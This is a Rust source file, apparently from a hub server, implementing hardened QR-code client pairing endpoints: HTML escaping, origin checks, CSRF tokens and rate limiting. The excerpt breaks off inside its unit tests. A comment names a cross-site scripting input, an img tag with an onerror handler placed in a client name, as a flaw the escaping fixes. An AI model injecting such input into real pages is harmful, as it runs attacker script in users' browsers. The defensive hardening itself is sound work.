//! Hub client pairing — iLink-compatible QR endpoints + confirmation page.

use axum::{
    extract::{Path, Query, State},
    http::{HeaderMap, StatusCode},
    response::{Html, IntoResponse, Json},
};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex as StdMutex};
use std::time::{Duration, Instant};
use tracing::{debug, info, warn};

use crate::hub::pairing::PairingError;
use crate::hub::HubState;
use crate::ilink::types::{GetQrcodeResponse, QrcodeStatusResponse};

static PAIR_HTML_TEMPLATE: &str = include_str!("pair.html");

/// Escape the five HTML-special characters so the string is safe to
/// interpolate into a `text/html` body. A-M4-1: the previously raw
/// `client_name` flow let an attacker confirm a pairing with a `name`
/// containing `<img onerror=…>` and have it executed when the success
/// page was re-rendered on the device base origin.
fn html_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for ch in s.chars() {
        match ch {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            _ => out.push(ch),
        }
    }
    out
}

#[derive(Debug, Deserialize)]
pub struct BotQrcodeQuery {
    #[serde(default)]
    pub bot_type: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct QrcodeStatusQuery {
    pub qrcode: String,
    /// Ignored for Hub pairing; accepted for OpenClaw / iLink SDK compatibility.
    #[serde(default)]
    pub verify_code: Option<String>,
}

/// Body sent by OpenClaw `fetchQRCode` (POST).
#[derive(Debug, Deserialize, Default)]
pub struct BotQrcodeBody {
    #[serde(default)]
    pub local_token_list: Vec<String>,
}

/// Hold long-poll requests briefly so clients (OpenClaw) can wait on one HTTP call.
const QR_STATUS_LONG_POLL: Duration = Duration::from_secs(25);

/// How long a (code, ip) entry remains "occupied" once recorded. F-M3-1
/// hardening against iframe/service-worker replay; one attempt per IP per
/// code within the window is enough for a real phone scan, but blocks an
/// attacker from racing many requests through the same leaked `code`.
const PAIR_CONFIRM_RATE_LIMIT_WINDOW: Duration = Duration::from_secs(60);

/// Hard cap on the number of (code, ip) entries the limiter retains. The
/// cap is per-process, not per-window, and is reached only when an attacker
/// fires confirm requests with a high-cardinality set of (code, ip) tuples
/// to grow the map. A bounded LRU-like overflow policy keeps the limiter's
/// memory footprint independent of adversarial traffic.
///
/// Sized generously: 4096 unique (code, ip) tuples is more than the
/// MAX_PAIRING_SESSIONS * IPs-per-code observed in any realistic pairing
/// flow, and bounds the worst-case work per critical-section entry to a
/// small, bounded retain.
const PAIR_CONFIRM_RATE_LIMIT_MAX_ENTRIES: usize = 4096;

#[derive(Debug, Deserialize)]
pub struct PairConfirmRequest {
    pub name: String,
    pub label: Option<String>,
}

#[derive(Debug, Serialize)]
pub struct PairConfirmResponse {
    pub ret: i32,
    pub name: String,
    pub vtoken: String,
}

/// Device id for zero-config relay pairing (lazy-loaded once per process).
fn pairing_device_id() -> String {
    use std::sync::OnceLock;
    static DEVICE_ID: OnceLock<String> = OnceLock::new();
    DEVICE_ID
        .get_or_init(|| {
            crate::relay::DeviceIdentity::load_or_create()
                .map(|id| id.device_id().to_string())
                .unwrap_or_else(|e| {
                    warn!(error = %e, "failed to load device identity, using ephemeral id");
                    uuid::Uuid::new_v4().to_string()
                })
        })
        .clone()
}

/// Public URL embedded in pairing QR codes (must be reachable from a phone).
fn pair_public_url() -> String {
    crate::relay::resolve_pair_public_url(&pairing_device_id())
}

/// API base URL returned to iLink clients after pairing (usually localhost).
fn client_base_url() -> String {
    std::env::var("HUB_CLIENT_URL")
        .ok()
        .map(|s| s.trim().trim_end_matches('/').to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "http://127.0.0.1:8765".to_string())
}

/// Strip default ports from a URL so the Origin allowlist check is robust against
/// `https://example.com:443` vs `https://example.com`.
fn origin_matches_device_base(origin: &str) -> bool {
    let base = pair_public_url();
    if let (Ok(parsed_origin), Ok(parsed_base)) = (url::Url::parse(origin), url::Url::parse(&base))
    {
        if parsed_origin.scheme() != parsed_base.scheme() {
            return false;
        }
        if parsed_origin.host_str() != parsed_base.host_str() {
            return false;
        }
        let o_port = parsed_origin.port_or_known_default();
        let b_port = parsed_base.port_or_known_default();
        return o_port == b_port;
    }
    // If either URL fails to parse, fall back to a strict string compare so we
    // never accidentally accept a malformed origin.
    origin.trim_end_matches('/') == base.trim_end_matches('/')
}

/// F-M1-B: pure helper that classifies a (Origin?, Referer?) header pair
/// against the device's pair-public-url allowlist. Returning a
/// `Result<(), OriginCheckError>` lets the handler pick the right HTTP
/// status (403 for "missing", 403 for "mismatched") and lets us unit-test
/// the policy in isolation.
#[derive(Debug, PartialEq, Eq)]
pub enum OriginCheckError {
    Missing,
    NotAllowed,
}

pub fn check_origin_or_referer(
    origin_header: Option<&str>,
    referer_header: Option<&str>,
) -> Result<(), OriginCheckError> {
    // F-M1-B: a request with NEITHER header is rejected. The previous
    // if/else-if chain had no terminating `else` and let bare-curl bypass
    // the cross-origin guard.
    let value = match origin_header.or(referer_header) {
        None => return Err(OriginCheckError::Missing),
        Some(v) => v,
    };
    // If `value` is a Referer URL (no scheme://host[:port] form), normalize
    // it. The string-compare fallback in `origin_matches_device_base`
    // handles malformed Referers safely.
    let origin_to_check = if value.contains("://") {
        value.to_string()
    } else {
        match url::Url::parse(value) {
            Ok(parsed) => {
                let mut s = format!("{}://{}", parsed.scheme(), parsed.host_str().unwrap_or(""));
                if let Some(port) = parsed.port() {
                    s.push(':');
                    s.push_str(&port.to_string());
                }
                s
            }
            Err(_) => value.to_string(),
        }
    };
    if origin_matches_device_base(&origin_to_check) {
        Ok(())
    } else {
        Err(OriginCheckError::NotAllowed)
    }
}

/// Per-(code, ip) sliding-window counter. Trimmed lazily on insert.
///
/// F-M3-1: a single (code, ip) tuple may be recorded at most once within
/// `PAIR_CONFIRM_RATE_LIMIT_WINDOW`. A real phone scan produces exactly one
/// request from a given IP, so 1/window is enough for legitimate traffic
/// while denying iframe/service-worker replays.
///
/// Concurrency: the map is guarded by a `std::sync::Mutex`. We use the sync
/// primitive (not `tokio::sync::Mutex`) because the critical section is
/// strictly synchronous — no `.await` happens while the lock is held, and
/// the body does not park the worker. Using `tokio::sync::Mutex` here would
/// just add the cost of an async-aware acquire with no benefit, and using
/// either flavour requires the same care about not awaiting inside the
/// guard.
///
/// Correctness (A-M3-1): the prior count-then-insert was a TOCTOU race —
/// two concurrent tasks could each observe `count == 0` and both pass the
/// guard, both `insert()`, and both return `true`. The fixed form uses a
/// single `contains_key` + `insert` inside the same critical section,
/// making the "first attempt wins, all subsequent attempts lose" outcome
/// observable to every other task as soon as the mutex is released.
///
/// Memory bound (A-M3-2): the map is capped at
/// `PAIR_CONFIRM_RATE_LIMIT_MAX_ENTRIES`. When the cap is reached we evict
/// the oldest entry by `Instant` to make room for the new one. This
/// guarantees the map size is bounded regardless of attacker-supplied
/// (code, ip) cardinality.
#[derive(Default)]
pub struct PairConfirmRateLimiter {
    /// (code, ip) → first-seen instant
    attempts: StdMutex<HashMap<(String, String), Instant>>,
}

impl PairConfirmRateLimiter {
    pub fn check_and_record(&self, code: &str, ip: &str) -> bool {
        let now = Instant::now();
        let key = (code.to_string(), ip.to_string());
        let mut attempts = self.attempts.lock().unwrap_or_else(|e| e.into_inner());

        // Purge stale entries so the bound stays tight under sustained
        // legit traffic. The retain is O(n) but bounded by
        // PAIR_CONFIRM_RATE_LIMIT_MAX_ENTRIES.
        attempts.retain(|_, t| now.duration_since(*t) < PAIR_CONFIRM_RATE_LIMIT_WINDOW);

        // A-M3-1: single contains_key check + insert in one critical
        // section. With the previous count-then-insert form, two tasks
        // could both observe "no entries for (code, ip)" and both pass the
        // guard under contention. The single contains_key is sufficient
        // because the policy is "first attempt wins, all others lose"
        // (one attempt per (code, ip) per window) — we never need a
        // counter.
        if attempts.contains_key(&key) {
            return false;
        }

        // A-M3-2: bound the map size. If we are at the cap, drop the
        // oldest entry to make room. (Any policy that drops SOMETHING is
        // acceptable here; the attacker can still fill the cap, but
        // cannot grow it past the cap.)
        if attempts.len() >= PAIR_CONFIRM_RATE_LIMIT_MAX_ENTRIES {
            if let Some(oldest) = attempts
                .iter()
                .min_by_key(|(_, t)| **t)
                .map(|(k, _)| k.clone())
            {
                attempts.remove(&oldest);
            }
        }

        attempts.insert(key, now);
        true
    }

    /// Test-only: number of tracked (code, ip) entries. Used by the
    /// concurrency regression test to assert the cap holds.
    #[doc(hidden)]
    pub fn tracked_count(&self) -> usize {
        let attempts = self.attempts.lock().unwrap_or_else(|e| e.into_inner());
        attempts.len()
    }
}

static PAIR_CONFIRM_RATE_LIMITER: std::sync::OnceLock<PairConfirmRateLimiter> =
    std::sync::OnceLock::new();

fn pair_confirm_rate_limiter() -> &'static PairConfirmRateLimiter {
    PAIR_CONFIRM_RATE_LIMITER.get_or_init(PairConfirmRateLimiter::default)
}

pub async fn register_client_in_hub(
    state: &HubState,
    name: String,
    label: Option<String>,
) -> RegisterClientOutcome {
    // Lock order: registry → router (always). MUST NOT be called while
    // `state.clients.pairing.write()` is held; doing so would introduce a new
    // `pairing → registry → router` lock order that deadlocks against any
    // future code path that takes registry+router and then pairing. (F-M1-1)
    let (plaintext, hashed, is_new, is_first) = {
        let mut registry = state.clients.registry.write().await;
        let (plaintext, hashed, is_new) = registry.register(name.clone(), label.clone());
        let is_first = is_new && registry.all_clients().len() == 1;
        (plaintext, hashed, is_new, is_first)
    };

    if is_first {
        let mut router = state.routing.router.lock().await;
        router.set_default(hashed.clone());
        // Persist the default so it survives hub restarts (HUB_DEFAULT_SENTINEL row).
        if let Err(e) = state
            .store
            .set_route(crate::store::HUB_DEFAULT_SENTINEL, &hashed)
            .await
        {
            warn!(error = %e, "failed to persist default client on first registration");
        }
    }

    if let Err(e) = state
        .store
        .upsert_client(&hashed, &name, label.as_deref())
        .await
    {
        warn!(error = %e, name = %name, "failed to persist paired client");
    }

    RegisterClientOutcome {
        plaintext,
        hashed,
        is_new,
    }
}

pub async fn register_confirmed_client_in_hub(
    state: &HubState,
    name: String,
    label: Option<String>,
    vtoken_plain: String,
) -> Result<RegisterClientOutcome, PairingError> {
    use crate::hub::hash_vtoken;

    let hashed = hash_vtoken(&vtoken_plain);
    let is_first = {
        let mut registry = state.clients.registry.write().await;
        if registry
            .register_confirmed(name.clone(), label.clone(), hashed.clone())
            .is_err()
        {
            return Err(PairingError::NameCollision);
        }
        registry.all_clients().len() == 1
    };

    if is_first {
        let mut router = state.routing.router.lock().await;
        router.set_default(hashed.clone());
    }

    if let Err(e) = state
        .store
        .upsert_client(&hashed, &name, label.as_deref())
        .await
    {
        warn!(error = %e, name = %name, "failed to persist paired client");
    }

    Ok(RegisterClientOutcome {
        plaintext: vtoken_plain,
        hashed,
        is_new: true,
    })
}

/// Outcome of a single [`register_client_in_hub`] call.
///
/// The two vtoken views coexist by design: `plaintext` is the bearer
/// credential the bridge needs (returned to the caller exactly once and
/// never persisted), `hashed` is the SHA-256 form the registry / store /
/// queue use as the canonical key. Re-registration of an existing name
/// yields `plaintext = ""` and `hashed = existing_hash`, since the
/// original plaintext is no longer recoverable.
#[derive(Debug, Clone)]
pub struct RegisterClientOutcome {
    pub plaintext: String,
    pub hashed: String,
    pub is_new: bool,
}

#[derive(Debug)]
pub enum UnregisterClientError {
    NotFound,
    StillOnline,
    Store(anyhow::Error),
}

/// Remove a registered backend client from memory, DB, routing, and its message queue.
///
/// When `force` is `false` the call is rejected with [`UnregisterClientError::StillOnline`]
/// if the client is currently marked online.  Set `force = true` to skip that check — useful
/// when the bridge manager has just killed the child process and knows the client will stop
/// polling within seconds.
pub async fn unregister_client_in_hub(
    state: &HubState,
    name: &str,
    force: bool,
) -> Result<(), UnregisterClientError> {
    let vtoken = {
        let registry = state.clients.registry.read().await;
        let Some(client) = registry.get_by_name(name) else {
            return Err(UnregisterClientError::NotFound);
        };
        if client.online && !force {
            return Err(UnregisterClientError::StillOnline);
        }
        client.vtoken.clone()
    };

    // Lock order: registry → router (always). Drop registry before acquiring router.
    let new_default = {
        let mut registry = state.clients.registry.write().await;
        if !registry.remove(name) {
            return Err(UnregisterClientError::NotFound);
        }
        registry.pick_default_after_remove(&vtoken)
    };
    {
        let mut router = state.routing.router.lock().await;
        router.remove_routes_for_vtoken(&vtoken, new_default);
    }

    if let Err(e) = state.clients.queue.remove_client(&vtoken).await {
        warn!(error = %e, vtoken = %crate::redact_token(&vtoken), "failed to remove client queue");
    }

    state
        .store
        .clear_routes_for_vtoken(&vtoken)
        .await
        .map_err(UnregisterClientError::Store)?;
    state
        .store
        .delete_client_by_name(name)
        .await
        .map_err(UnregisterClientError::Store)?;

    info!(client = %name, vtoken = %crate::redact_token(&vtoken), "admin deleted offline client");
    Ok(())
}

#[derive(Debug)]
pub enum UpdateClientError {
    NotFound,
    NameTaken,
    InvalidName,
    Store(anyhow::Error),
}

/// Update a registered client's name and label in memory and DB.
pub async fn update_client_in_hub(
    state: &HubState,
    old_name: &str,
    new_name: &str,
    label: Option<String>,
) -> Result<String, UpdateClientError> {
    let new_name = new_name.trim();
    if new_name.is_empty() {
        return Err(UpdateClientError::InvalidName);
    }

    let label_for_store = label.clone();
    let vtoken = {
        let mut registry = state.clients.registry.write().await;
        registry
            .update_client(old_name, new_name, label)
            .map_err(|e| match e {
                crate::hub::registry::UpdateClientError::NotFound => UpdateClientError::NotFound,
                crate::hub::registry::UpdateClientError::NameTaken => UpdateClientError::NameTaken,
            })?
    };

    state
        .store
        .update_client_by_vtoken(&vtoken, new_name, label_for_store.as_deref())
        .await
        .map_err(UpdateClientError::Store)?;

    info!(
        old_name = %old_name,
        new_name = %new_name,
        vtoken = %crate::redact_token(&vtoken),
        "admin updated client"
    );
    Ok(vtoken)
}

fn build_pairing_qr_response(code: String) -> GetQrcodeResponse {
    let base = pair_public_url();
    let pair_url = crate::relay::pair_qr_url(&base, &code);
    // SEC-013 / F-M3-3: pair_url contains an unconfirmed active code; demote to
    // debug to avoid leaking it via the INFO log stream.
    debug!(code = %code, pair_url = %pair_url, "pairing QR session created");
    GetQrcodeResponse {
        ret: 0,
        qrcode: Some(code),
        qrcode_img_content: Some(pair_url),
        errmsg: None,
    }
}

async fn create_pairing_qr(state: &HubState) -> GetQrcodeResponse {
    let code = {
        let mut pairing = state.clients.pairing.write().await;
        match pairing.create() {
            Ok(code) => code,
            Err(PairingError::TooManySessions) => {
                return GetQrcodeResponse {
                    ret: -1,
                    qrcode: None,
                    qrcode_img_content: None,
                    errmsg: Some("too many active pairing sessions; retry shortly".to_string()),
                };
            }
            Err(_) => {
                return GetQrcodeResponse {
                    ret: -1,
                    qrcode: None,
                    qrcode_img_content: None,
                    errmsg: Some("failed to create pairing session".to_string()),
                };
            }
        }
    };
    build_pairing_qr_response(code)
}

/// `GET /ilink/bot/get_bot_qrcode` — start a Hub pairing session (not WeChat login).
pub async fn get_bot_qrcode(
    State(state): State<Arc<HubState>>,
    Query(_query): Query<BotQrcodeQuery>,
) -> Json<GetQrcodeResponse> {
    Json(create_pairing_qr(state.as_ref()).await)
}

/// `POST /ilink/bot/get_bot_qrcode` — OpenClaw sends `local_token_list` in the body.
pub async fn get_bot_qrcode_post(
    State(state): State<Arc<HubState>>,
    Query(_query): Query<BotQrcodeQuery>,
    Json(body): Json<BotQrcodeBody>,
) -> Json<GetQrcodeResponse> {
    if !body.local_token_list.is_empty() {
        debug!(
            count = body.local_token_list.len(),
            "get_bot_qrcode POST (local_token_list ignored for hub pairing)"
        );
    }
    Json(create_pairing_qr(state.as_ref()).await)
}

async fn qrcode_status_json(state: &HubState, qrcode: &str) -> QrcodeStatusResponse {
    let session = {
        let pairing = state.clients.pairing.read().await;
        pairing.get(qrcode)
    };

    let Some(session) = session else {
        return QrcodeStatusResponse {
            ret: -1,
            status: Some("expired".to_string()),
            bot_token: None,
            baseurl: None,
            ilink_bot_id: None,
            ilink_user_id: None,
            errmsg: Some("pairing session not found".to_string()),
        };
    };

    let client_base = client_base_url();
    let status = session.status_str().to_string();
    let bot_token = session.vtoken.clone();

    QrcodeStatusResponse {
        ret: 0,
        status: Some(status),
        bot_token,
        baseurl: if session.status_str() == "confirmed" {
            Some(client_base)
        } else {
            None
        },
        ilink_bot_id: Some("ilink-hub@hub.local".to_string()),
        ilink_user_id: Some("hub-client".to_string()),
        errmsg: None,
    }
}

/// `GET /ilink/bot/get_qrcode_status` — poll pairing progress (long-poll friendly).
pub async fn get_qrcode_status(
    State(state): State<Arc<HubState>>,
    Query(query): Query<QrcodeStatusQuery>,
) -> Json<QrcodeStatusResponse> {
    if query.verify_code.is_some() {
        debug!("verify_code ignored for hub client pairing");
    }

    let deadline = Instant::now() + QR_STATUS_LONG_POLL;
    // Pin the Notify future outside the loop to avoid lost-wakeup: recreating
    // notified() each iteration discards any notification that fired between
    // the previous select! arm returning and this call. With a pinned future,
    // the notification is captured once and survives across loop iterations
    // until it is actually delivered.
    let mut notified = std::pin::pin!(state.clients.pairing_notify.notified());
    loop {
        let resp = qrcode_status_json(state.as_ref(), &query.qrcode).await;
        let terminal = resp.status.as_deref() != Some("wait");
        if terminal || Instant::now() >= deadline {
            return Json(resp);
        }
        let remaining = deadline.saturating_duration_since(Instant::now());
        tokio::select! {
            _ = &mut notified => {
                // Re-arm for the next iteration in case this was a spurious
                // wake from a different code's transition.
                notified.set(state.clients.pairing_notify.notified());
            }
            _ = tokio::time::sleep(remaining) => {}
        }
    }
}

/// `GET /hub/pair/{code}` — mobile-friendly confirmation page.
pub async fn pair_page(
    State(state): State<Arc<HubState>>,
    Path(code): Path<String>,
) -> impl IntoResponse {
    let session = {
        let mut pairing = state.clients.pairing.write().await;
        let changed = pairing.get(&code).is_some() && {
            pairing.mark_scanned(&code);
            true
        };
        if changed {
            state.clients.pairing_notify.notify_waiters();
        }
        pairing.get(&code)
    };

    let Some(session) = session else {
        return (
            StatusCode::NOT_FOUND,
            Html("<h1>配对码无效或已过期</h1><p>请回到客户端重新获取二维码。</p>".to_string()),
        )
            .into_response();
    };

    if session.status_str() == "expired" {
        return (
            StatusCode::GONE,
            Html("<h1>配对码已过期</h1><p>请回到客户端重新获取二维码。</p>".to_string()),
        )
            .into_response();
    }

    if session.status_str() == "confirmed" {
        let name = session.client_name.as_deref().unwrap_or("client");
        let name = html_escape(name);
        return (
            StatusCode::OK,
            Html(format!(
                "<h1>已配对</h1><p>客户端 <strong>{name}</strong> 已成功接入。</p>"
            )),
        )
            .into_response();
    }

    // The CSRF token is bound to the session and was just (re-)issued by
    // mark_scanned. It must be present whenever status is Wait or Scanned.
    let csrf = match session.csrf.as_deref() {
        Some(t) => t.to_string(),
        None => {
            warn!(code = %code, "pair session has no csrf token; refusing to render");
            return (
                StatusCode::INTERNAL_SERVER_ERROR,
                Html("<h1>内部错误</h1><p>无法生成配对凭证，请重试。</p>".to_string()),
            )
                .into_response();
        }
    };

    let html = PAIR_HTML_TEMPLATE
        .replace("__PAIR_CODE__", &code)
        .replace("__PAIR_CSRF__", &csrf);
    (StatusCode::OK, Html(html)).into_response()
}

/// Best-effort rollback for a speculative `register_client_in_hub` call that
/// lost the race under the pairing write lock. F-M1-2: prevents orphan
/// vtoken / queue / store row accumulation when confirm() returns
/// AlreadyConfirmed (or any other non-Ok) for the speculative winner.
///
/// F-M1-A: this MUST only be called when the speculative register actually
/// inserted a fresh row (`is_new == true`). If the supplied name was already
/// registered, the registry returned the legitimate client's vtoken and
/// rolling it back would evict that legitimate client (CWE-863/CWE-284).
/// The CAS check on `by_vtoken` adds a second layer of defence: even if a
/// caller passes `is_new = true` after a TOCTOU window in which the
/// legitimate entry was re-registered, the rollback aborts.
pub async fn rollback_speculative_register(state: &HubState, name: &str, vtoken: &str) {
    let new_default = {
        let mut registry = state.clients.registry.write().await;
        // CAS: only remove if the by_vtoken entry still maps `name → vtoken`.
        // If the entry was rewritten (legitimate re-register), the rollback
        // is a no-op and the legitimate client survives.
        match registry.get_by_name(name) {
            Some(info) if info.vtoken == vtoken => {}
            _ => {
                debug!(
                    name = %name,
                    "rollback_speculative_register: name no longer maps to the \
                     speculative vtoken; refusing to roll back (F-M1-A defence)"
                );
                return;
            }
        }
        if !registry.remove(name) {
            return;
        }
        registry.pick_default_after_remove(vtoken)
    };
    {
        let mut router = state.routing.router.lock().await;
        router.remove_routes_for_vtoken(vtoken, new_default);
    }
    if let Err(e) = state.clients.queue.remove_client(vtoken).await {
        warn!(
            error = %e,
            vtoken = %&vtoken[..vtoken.len().min(8)],
            "failed to remove speculative-winner queue during rollback"
        );
    }
    if let Err(e) = state.store.clear_routes_for_vtoken(vtoken).await {
        warn!(
            error = %e,
            vtoken = %&vtoken[..vtoken.len().min(8)],
            "failed to clear speculative-winner routes during rollback"
        );
    }
    if let Err(e) = state.store.delete_client_by_name(name).await {
        warn!(error = %e, name = %name, "failed to delete speculative-winner client during rollback");
    }
}

/// `POST /hub/pair/{code}/confirm` — approve pairing and issue vtoken.
///
/// Lock ordering (F-M1-1 Option A): `register_client_in_hub` runs OUTSIDE the
/// `state.clients.pairing.write()` critical section, preserving the canonical
/// `registry → router` invariant. The speculative vtoken is then offered
/// under the pairing lock, which performs the atomic state check + CSRF
/// verify + final commit. If confirm fails (AlreadyConfirmed, NotScanned,
/// etc.), the speculative register is rolled back to prevent an orphan
/// vtoken/queue/store-row from leaking (F-M1-2).
pub async fn pair_confirm(
    State(state): State<Arc<HubState>>,
    Path(code): Path<String>,
    headers: HeaderMap,
    peer_ip: axum::extract::ConnectInfo<std::net::SocketAddr>,
    Json(req): Json<PairConfirmRequest>,
) -> (StatusCode, Json<serde_json::Value>) {
    const MAX_NAME_LEN: usize = 64;
    let name = req.name.trim().to_string();
    if name.is_empty() {
        return (
            StatusCode::BAD_REQUEST,
            Json(serde_json::json!({ "error": "name is required" })),
        );
    }
    if name.len() > MAX_NAME_LEN {
        return (
            StatusCode::BAD_REQUEST,
            Json(
                serde_json::json!({ "error": format!("name must be at most {MAX_NAME_LEN} characters") }),
            ),
        );
    }
    let label = req
        .label
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty());
    if let Some(ref l) = label {
        if l.len() > MAX_NAME_LEN {
            return (
                StatusCode::BAD_REQUEST,
                Json(
                    serde_json::json!({ "error": format!("label must be at most {MAX_NAME_LEN} characters") }),
                ),
            );
        }
    }

    // Resolve the effective client IP. When the request arrives from loopback AND
    // carries the per-process relay secret (proving it came from the in-process relay
    // client rather than any other local process), trust X-Forwarded-For as the real
    // phone IP. Without a matching secret, loopback connections use their actual address.
    let relay_secret_ok = headers
        .get("x-ilink-relay-secret")
        .and_then(|v| v.to_str().ok())
        .map(|v| {
            use subtle::ConstantTimeEq;
            v.as_bytes()
                .ct_eq(state.relay_secret.as_bytes())
                .unwrap_u8()
                == 1
        })
        .unwrap_or(false);
    let effective_ip = if peer_ip.0.ip().is_loopback() && relay_secret_ok {
        headers
            .get("x-forwarded-for")
            .and_then(|v| v.to_str().ok())
            .and_then(|s| s.split(',').next())
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .unwrap_or_else(|| peer_ip.0.ip().to_string())
    } else {
        peer_ip.0.ip().to_string()
    };

    // F-M3-1: rate-limit by (code, peer_ip) to slow code-guessing and
    // iframe/service-worker replay attacks.
    if !pair_confirm_rate_limiter().check_and_record(&code, &effective_ip) {
        return (
            StatusCode::TOO_MANY_REQUESTS,
            Json(serde_json::json!({ "error": "too many confirm attempts for this pairing code" })),
        );
    }

    // F-M3-1: Origin/Referer allowlist — reject cross-origin POSTs (drive-by
    // CSRF can't set custom headers without preflight, but iframe +
    // service-worker can still trigger a same-origin fetch on the user's
    // behalf if the page is embedded; this Origin check closes that).
    //
    // F-M1-B: the previous if/else-if chain had no terminating `else`
    // rejection, so a request with NEITHER header (curl/wget) bypassed the
    // check. The extracted `check_origin_or_referer` helper enforces the
    // "at least one header present + must match device base" policy.
    let origin_hdr = headers
        .get("origin")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string);
    let referer_hdr = headers
        .get("referer")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string);
    if let Err(err) = check_origin_or_referer(origin_hdr.as_deref(), referer_hdr.as_deref()) {
        return match err {
            OriginCheckError::Missing => (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({ "error": "origin header required" })),
            ),
            OriginCheckError::NotAllowed => (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({ "error": "origin not allowed" })),
            ),
        };
    }

    // SEC-013: CSRF token must be supplied via `X-Pair-CSRF` header.
    let csrf_header = match headers.get("x-pair-csrf").and_then(|v| v.to_str().ok()) {
        Some(v) if !v.is_empty() => v.to_string(),
        _ => {
            return (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({ "error": "missing or invalid CSRF token" })),
            );
        }
    };

    // Pre-check the pairing session before speculative registry insertion to prevent
    // unauthorized registration pollution and database writes (SEC-M1-001, SEC-M1-002).
    {
        let mut pairing = state.clients.pairing.write().await;
        if let Err(e) = pairing.pre_check_confirm(&code, &csrf_header) {
            return match e {
                PairingError::NotFound => (
                    StatusCode::NOT_FOUND,
                    Json(serde_json::json!({ "error": "pairing session not found" })),
                ),
                PairingError::Expired => (
                    StatusCode::GONE,
                    Json(serde_json::json!({ "error": "pairing session expired" })),
                ),
                PairingError::AlreadyConfirmed => (
                    StatusCode::CONFLICT,
                    Json(serde_json::json!({ "error": "pairing already confirmed" })),
                ),
                PairingError::NotScanned => (
                    StatusCode::PRECONDITION_FAILED,
                    Json(serde_json::json!({ "error": "pairing code not yet scanned" })),
                ),
                PairingError::CsrfMismatch => (
                    StatusCode::FORBIDDEN,
                    Json(serde_json::json!({ "error": "csrf token mismatch" })),
                ),
                PairingError::TooManySessions => (
                    StatusCode::SERVICE_UNAVAILABLE,
                    Json(serde_json::json!({ "error": "too many active pairing sessions" })),
                ),
                PairingError::NameCollision => (
                    StatusCode::CONFLICT,
                    Json(serde_json::json!({ "error": "client name already registered" })),
                ),
            };
        }
    }

    // Generate a fresh vtoken plain/hash first. Since we removed speculative
    // register, we do not pollute the global registry or db on failure. (SEC-M1-001, SEC-M1-002)
    let vtoken_plain = format!("vhub_{}", uuid::Uuid::new_v4().simple());

    // Atomic check + commit under the pairing write lock.
    let confirm_result = {
        let mut pairing = state.clients.pairing.write().await;
        pairing.confirm(
            &code,
            name.clone(),
            label.clone(),
            vtoken_plain.clone(),
            &csrf_header,
        )
    };

    match confirm_result {
        Ok(()) => {
            // Confirm passed, now try to write to global registry. (SEC-M1-001, SEC-M1-002)
            match register_confirmed_client_in_hub(
                state.as_ref(),
                name.clone(),
                label,
                vtoken_plain.clone(),
            )
            .await
            {
                Ok(_) => {
                    state.clients.pairing_notify.notify_waiters();
                    debug!(code = %code, name = %name, "pairing confirmed");
                    (
                        StatusCode::OK,
                        Json(serde_json::json!({
                            "ret": 0,
                            "name": name,
                            "vtoken": vtoken_plain,
                        })),
                    )
                }
                Err(e) => {
                    // Global write failed (e.g. name collision). Roll back the confirmed pairing session.
                    {
                        let mut pairing = state.clients.pairing.write().await;
                        pairing.remove_confirmed(&code);
                    }
                    match e {
                        PairingError::NameCollision => (
                            StatusCode::CONFLICT,
                            Json(serde_json::json!({ "error": "client name already registered" })),
                        ),
                        _ => (
                            StatusCode::INTERNAL_SERVER_ERROR,
                            Json(serde_json::json!({ "error": "failed to register client" })),
                        ),
                    }
                }
            }
        }
        Err(e) => match e {
            PairingError::NotFound => (
                StatusCode::NOT_FOUND,
                Json(serde_json::json!({ "error": "pairing session not found" })),
            ),
            PairingError::Expired => (
                StatusCode::GONE,
                Json(serde_json::json!({ "error": "pairing session expired" })),
            ),
            PairingError::AlreadyConfirmed => (
                StatusCode::CONFLICT,
                Json(serde_json::json!({ "error": "pairing already confirmed" })),
            ),
            PairingError::NotScanned => (
                StatusCode::PRECONDITION_FAILED,
                Json(serde_json::json!({ "error": "pairing code not yet scanned" })),
            ),
            PairingError::CsrfMismatch => (
                StatusCode::FORBIDDEN,
                Json(serde_json::json!({ "error": "csrf token mismatch" })),
            ),
            PairingError::TooManySessions => (
                StatusCode::SERVICE_UNAVAILABLE,
                Json(serde_json::json!({ "error": "too many active pairing sessions" })),
            ),
            PairingError::NameCollision => (
                StatusCode::CONFLICT,
                Json(serde_json::json!({ "error": "client name already registered" })),
            ),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // F-M1-B: the policy helper must reject a request with neither
    // header — this is the regression the M1 review flagged.
    #[test]
    fn check_origin_or_referer_rejects_missing_headers() {
        assert_eq!(
            check_origin_or_referer(None, None),
            Err(OriginCheckError::Missing),
            "F-M1-B: missing both Origin and Referer must be rejected (the \
             pre-fix if/else-if chain had no terminating else)"
        );
    }

    // F-M1-B: Origin present, but a clearly foreign scheme/host
    // (relative to the device base URL) must be rejected as
    // NotAllowed. We can't pin the exact base URL here without
    // mutating env, so we just assert that any non-base origin is
    // rejected — the pre-fix code would have either let it through
    // (no header case) or fallen into the NotAllowed branch.
    #[test]
    fn check_origin_or_referer_rejects_garbage() {
        assert_eq!(
            check_origin_or_referer(Some("not a url"), None),
            Err(OriginCheckError::NotAllowed),
            "garbage Origin must be rejected as NotAllowed"
        );
        assert_eq!(
            check_origin_or_referer(None, Some("not a url")),
            Err(OriginCheckError::NotAllowed),
            "garbage Referer must be rejected as NotAllowed"
        );
    }

    // F-M1-B: when a Referer is present and parses as a URL, the
    // helper normalises it to scheme://host[:port] before the
    // allowlist compare. This is the path the previous code took
    // inside the if/else-if chain — moving it to a helper makes
    // the policy testable in isolation.
    #[test]
    fn check_origin_or_referer_accepts_well_formed_referer() {
        // Pair-public-url resolves to something like http://127.0.0.1:PORT
        // (or similar) in tests; the exact value is environment-driven.
